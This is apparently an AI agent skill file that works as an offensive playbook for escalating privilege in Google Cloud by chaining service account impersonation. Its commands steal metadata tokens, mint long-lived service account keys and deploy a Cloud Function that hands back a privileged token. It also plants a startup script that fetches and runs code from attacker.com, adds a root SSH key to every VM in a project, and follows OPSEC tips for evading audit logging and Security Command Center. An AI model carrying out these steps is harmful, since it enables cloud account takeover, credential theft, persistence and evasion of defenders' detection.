---
name: gcp-svc-account-impersonation
description: "GCP service account impersonation chain — IAM `roles/iam.serviceAccountTokenCreator`, `roles/iam.serviceAccountUser`, `actAs` on Cloud Functions / Cloud Run / Compute Engine. Pivot from low-priv SA to org-admin via chained impersonation."
allowed-tools: Bash Read Write
metadata:
  when_to_use: "gcp google cloud service account impersonation token creator actAs roles/iam compute cloud functions cloud run workload identity"
  subdomain: cloud
  tags: gcp, iam, service-account, privilege-escalation
  mitre_attack: T1078.004, T1098, T1550.001
---

# GCP Service Account Impersonation

You have a GCP token (compromised VM metadata, leaked service account key, gcloud SDK). Find the impersonation chain to higher privilege.

## Steal the token

### From GCE / GKE / Cloud Run / Functions
```bash
TOKEN=$(curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
  | jq -r .access_token)

# All service accounts on the VM:
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/"
```

### From a leaked key.json
```bash
gcloud auth activate-service-account --key-file=key.json
TOKEN=$(gcloud auth print-access-token)
```

## Phase 1: Enumerate current permissions

```bash
# Which projects are you in?
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://cloudresourcemanager.googleapis.com/v1/projects" | jq -r '.projects[].projectId'

# What can you do in a project?
PROJECT=$(gcloud config get-value project)
gcloud projects test-iam-permissions "$PROJECT" \
  --permissions=$(curl -s https://iam.googleapis.com/v1/permissions:queryTestablePermissions -X POST -H "Authorization: Bearer $TOKEN" -d "{\"fullResourceName\":\"//cloudresourcemanager.googleapis.com/projects/$PROJECT\"}" | jq -r '.permissions[].name' | tr '\n' ',' | sed 's/,$//')

# Or use the bucket-list shortcut (most SAs can list):
gcloud projects get-iam-policy "$PROJECT" --format=json | jq '.bindings[]'
```

## Phase 2: Impersonation primitives

### `roles/iam.serviceAccountTokenCreator`
If you have `iam.serviceAccounts.getAccessToken` on a higher-priv SA:

```bash
gcloud auth print-access-token --impersonate-service-account=highpriv@PROJECT.iam.gserviceaccount.com
# OR raw:
curl -s -X POST -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"scope":["https://www.googleapis.com/auth/cloud-platform"]}' \
  "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/highpriv@PROJECT.iam.gserviceaccount.com:generateAccessToken" \
  | jq -r .accessToken
```

### `iam.serviceAccountKeys.create`
Mint a permanent JSON key for any SA you can act-on:

```bash
gcloud iam service-accounts keys create /tmp/k.json \
  --iam-account=target@PROJECT.iam.gserviceaccount.com
# Long-lived credential — survives token rotation.
```

### `cloudfunctions.functions.update` + `actAs`
Deploy a function that runs AS a more-priv SA:

```bash
mkdir fn && cat > fn/main.py <<'EOF'
def pwn(request):
    import subprocess
    out = subprocess.check_output("curl -s -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", shell=True)
    return out
EOF
echo "" > fn/requirements.txt
gcloud functions deploy pwn --source=fn --runtime=python311 --trigger-http --allow-unauthenticated \
  --service-account=highpriv@PROJECT.iam.gserviceaccount.com --entry-point=pwn
# Then HTTP-call it to get the higher-priv token
```

### `compute.instances.setMetadata`
Inject a `startup-script` that runs as the VM's SA on next boot:

```bash
gcloud compute instances add-metadata target-vm --zone=us-central1-a \
  --metadata=startup-script='curl -fsSL https://attacker.com/x.sh | bash'
gcloud compute instances reset target-vm --zone=us-central1-a
```

### `compute.projects.setCommonInstanceMetadata`
Project-wide metadata = SSH key on every VM in the project:

```bash
ssh-keygen -t ed25519 -f ./pwn -N ''
gcloud compute project-info add-metadata --metadata=ssh-keys="root:$(cat pwn.pub)"
```

## Phase 3: Cross-project pivot

```bash
# If your token has `resourcemanager.organizations.get`, you can see the org tree
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://cloudresourcemanager.googleapis.com/v1/organizations" | jq .

# Find SAs with cross-project bindings
for p in $(gcloud projects list --format='value(projectId)'); do
  echo "=== $p ==="
  gcloud projects get-iam-policy "$p" --format=json | jq -r '.bindings[] | "\(.role): \(.members | join(","))"'
done
```

## OPSEC

- Every IAM call logs to Cloud Audit Logs. SetMetadata + Reset is loud — prefer ImpersonateSA when possible.
- Token TTL 60min. Refresh from the same IMDS endpoint (no log) vs. requesting a new SA token (logged).
- Key creation creates a Cloud Audit `google.iam.admin.v1.CreateServiceAccountKey` event — high-fidelity detection.
- GCP Security Command Center flags startup-script changes — for evasion, set metadata on a service NOT under SCC monitoring.

## References

- gcp_enum / GCP IAM Privilege Escalation by RhinoSecurityLabs
- "Big GCP IAM Privilege Escalation List" — Praetorian
- DEFCON 27 "Privilege Escalation in GCP" — Spencer Gietzen
